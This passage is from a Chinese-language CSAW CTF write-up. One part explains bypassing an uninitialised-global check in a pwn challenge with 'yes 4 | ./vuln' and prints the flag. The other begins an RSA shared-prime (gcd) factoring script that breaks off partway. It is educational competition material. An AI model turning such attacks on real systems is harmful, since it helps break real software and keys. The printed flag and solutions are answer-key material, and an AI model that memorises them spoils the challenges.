class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-640px">着</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-688px">算</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-640px">真</span><span class="cjk cjk-bitmap" style="--cjk-x:-240px;--cjk-y:-640px">瞪</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-640px">眼</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-528px">法</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-656px">秒</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span>……
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-608px">现</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-208px">在</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:-96px">再</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-640px">看</span> 4 <span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-160px">号</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-128px">功</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-736px">能</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-496px">检</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-544px">测</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-784px">要</span><span class="cjk cjk-bitmap" style="--cjk-x:-128px;--cjk-y:-528px">求</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-976px">：</span>`(unsigned __int8)(16 * BYTE1(energy)) | (unsigned 
+__int64)(((energy &gt;&gt; 4) &amp; 0xF) == v7)`<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-208px">因</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-16px">为</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-48px">们</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-784px">要</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-736px">能</span> bypass <span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-800px">话</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-272px">就</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-736px">能</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-640px">直</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-416px">接</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-400px">拿</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-112px">到</span> f
+lag<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-880px">那</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-272px">就</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-368px">想</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-368px">想</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-480px">有</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-528px">没</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-480px">有</span><span class="cjk cjk-bitmap" style="--cjk-x:-224px;--cjk-y:-160px">可</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-736px">能</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-640px">直</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-416px">接</span> bypass<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-864px">这</span><span class="cjk cjk-bitmap" style="--cjk-x:-224px;--cjk-y:-496px">样</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-48px">们</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-272px">就</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-608px">用</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-352px">思</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-720px">考</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-240px">如</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-64px">何</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-112px">利</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-608px">用</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-224px">复</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-480px">杂</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-224px;--cjk-y:-224px">堆</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-432px">攻</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-112px">击</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:0px">。</span>
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-208px">因</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-16px">为</span> `energy` <span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-208px">在</span> bss <span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:0px">上</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-480px">未</span><span class="cjk cjk-bitmap" style="--cjk-x:-240px;--cjk-y:-112px">初</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-240px">始</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-128px">化</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-80px">全</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-288px">局</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-160px">变</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-896px">量</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-960px">默</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-800px">认</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-16px">为</span> 0<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-368px">所</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-48px">以</span> `(unsigned __int8)(1
+6 * BYTE1(energy))` <span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-80px">值</span><span class="cjk cjk-bitmap" style="--cjk-x:-224px;--cjk-y:-160px">可</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-48px">以</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-640px">直</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-416px">接</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-640px">确</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-256px">定</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-16px">为</span> 0<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:0px">。</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-608px">由</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-32px">于</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-864px">这</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-880px">里</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-64px">使</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-608px">用</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span> `|` <span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-880px">逻</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-848px">辑</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:0px">与</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-864px">运</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-688px">算</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-640px">相</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-320px">当</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-32px">于</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:0px">一</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-16px">个</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-304px">并</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-912px">集</span><span class="cjk cjk-bitmap" style="--cjk-x:-256px;--cjk-y:-432px">操</span><span class="cjk cjk-bitmap" style="--cjk-x:-128px;--cjk-y:-64px">作</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-368px">所</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-48px">以</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-240px">如</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-496px">果</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-48px">们</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-368px">想</span> bypass <span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-864px">这</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-16px">个</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-496px">检</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-544px">测</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-880px">那</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-192px">唯</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:0px">一</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-240px;--cjk-y:-480px">机</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-48px">会</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-272px">就</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-208px">在</span> rhs <span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-736px">能</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-736px">能</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-928px">非</span> 
+0 <span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-80px">值</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:0px">。</span>
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-352px">思</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-720px">考</span> rhs<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span>`(unsigned __int64)(((energy &gt;&gt; 4) &amp; 0xF) == v7`<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-256px">它</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-272px">将</span> energy <span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-80px">值</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-160px">右</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-672px">移</span> 4
+ bits<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-576px">然</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-160px">后</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-64px">保</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-624px">留</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-464px">最</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-64px">低</span> 4 bits<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-112px">判</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-448px">断</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-256px">它</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:0px">与</span> `v7` <span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-176px">否</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-640px">相</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-672px">等</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:0px">。</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-640px">相</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-672px">等</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-272px">就</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-864px">返</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-208px">回</span> 1<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-176px">否</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-112px">则</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-864px">返</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-208px">回</span> 0 <span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:0px">。</span>
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-608px">由</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-32px">于</span> energy <span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-800px">论</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-240px">如</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-64px">何</span><span class="cjk cjk-bitmap" style="--cjk-x:-256px;--cjk-y:-432px">操</span><span class="cjk cjk-bitmap" style="--cjk-x:-128px;--cjk-y:-64px">作</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-880px">都</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span> 0<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-864px">这</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-736px">肯</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-256px">定</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-880px">那</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-160px">只</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-784px">要</span> `v7` <span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-16px">也</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-16px">为</span> 0<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span>`0 == 0`<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span>rhs <span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-272px">就</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-864px">返</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-208px">回</span> 1<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span>`0 | 1` <span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-272px">就</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-672px">等</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-32px">于</span> 1<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-368px">成</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-128px">功</span> bypass <span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:0px">。</span>
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-720px">而</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-864px">这</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-16px">也</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-160px">只</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-928px">需</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-784px">要</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-48px">们</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-448px">断</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-848px">输</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-80px">入</span> 4 <span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-864px">选</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-928px">项</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-720px">罢</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span>……<span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-736px">至</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-32px">于</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-736px">能</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-736px">能</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-176px">命</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-16px">中</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-160px">只</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-16px">个</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-512px">概</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-608px">率</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-896px">问</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-944px">题</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:0px">。</span>
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-864px">这</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-880px">里</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-784px">解</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-528px">法</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span> `yes 4 | ./vuln`<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-800px">说</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-256px">实</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-800px">话</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-320px">当</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-448px">时</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-640px">看</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-112px">到</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-864px">这</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-16px">个</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-688px">答</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-496px">案</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-864px">还</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-480px">有</span><span class="cjk cjk-bitmap" style="--cjk-x:-224px;--cjk-y:-576px">点</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-352px">惊</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-800px">讶</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-160px">后</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-480px">来</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-368px">想</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-368px">想</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-640px">确</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-256px">实</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-736px">自</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-288px">己</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-864px">进</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-512px">步</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-672px">空</span><span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-896px">间</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-864px">还</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-240px">太</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-240px">大</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span>……
+
+## Exploit
+
+```bash
+yes 4 | ./vuln
+```
+
+## Flag
+
+:spoiler[`csawctf{tyjroj_71m3_7o_g0_h0m3_zoqSy9_5w337_h0m3_nywcyp}`]
+
+# Obligatory RSA
+
+## Information
+
+- Category: Crypto
+- Points: 500
+
+## Description
+
+&gt; Crypto just wouldn't be crypto without one!
+
+## Write-up
+
+RSA <span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-688px">简</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-144px">单</span><span class="cjk cjk-bitmap" style="--cjk-x:-240px;--cjk-y:-192px">啊</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span>~<span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-640px">直</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-416px">接</span><span class="cjk cjk-bitmap" style="--cjk-x:-240px;--cjk-y:-400px">拷</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-384px">打</span> AI xD~
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+import math
+
+from Crypto.Util.number import inverse, long_to_bytes
+
+e = 65537
+n1 = 129092526753383933030272290277107300767707654330551632967994396398045326531
+32030396318249748818247420246112069216273488043826141006654984563999202403741672
+02284210762826329045985197932430672203420371448642370207578182631283011382060811
+87472003821789897063195512919097350247829148288118913456964033001399074373
+n2 = 108355113470836594630192960651980673780103497896732213011958303033575870030
+50552816917472953049040591063429141534636068829045297652731690946964690828973202
+37157374393125720126481658195332346048506083902339381740818671468466391106859281
+36323983961395098632140681799175543046722931901766226759894951292033805879
+d1 = 888434959898698710015597548829180767798584044407803918185676396020731736232
+87821751315349650577023725245222074965050035045516207303078461168168819365025746
+97358924513157014394471820304645739127041845908776426663089056607903982173516880
+5805866019315142070438225092171304343352469029480503113942986147848666077
+d2 = 945651442759297640172418658124356686442189185379415677112256444744184581155
+44003036362558987818610553975855551983688286593672386482543188020042082319191545
+66055132429373892021402804534424967051299913754899449657712844616563288577574479
+5722253354007167294035878656056258332703809173397147948143695113558988035
+
+
+def solve():
+    print(&quot;--- Starting Common Factor Attack ---&quot;)
+    p = math.gcd(n1, n2)
+
+    if p &gt; 1:
+        print(&quot;[+] Success! A common factor was found.&quot;)
+        print(&quot;Shared Prime (p): {p}n&quot;)
+
+        q1 = n1 // p
+        q2 = n2 // p
+
+        print(&quot;--- Factoring Results ---&quot;)
+        print(&quot;q1: {q1}&quot;)
+        print(&quot;q2: {q2}&quot;)
+        print(&quot;[+] Verification successful: p * q1 == n1 and p * q2 == n2n&quot;)
+
+        # Calculate Euler's totient function
+        phi1 = (p - 1) * (q1 - 1)
+        phi2 = (p - 1) * (q2 - 1)
+
+        # Calculate the correct private keys
+        d_correct_1 = inverse(e, phi1)
+        d_correct_2 = inverse(e, phi2)
+        print(&quot;--- Calculated Correct Private Keys ---&quot;)
+        print(f&quot;d_correct_1: {d_correct_1}&quot;)
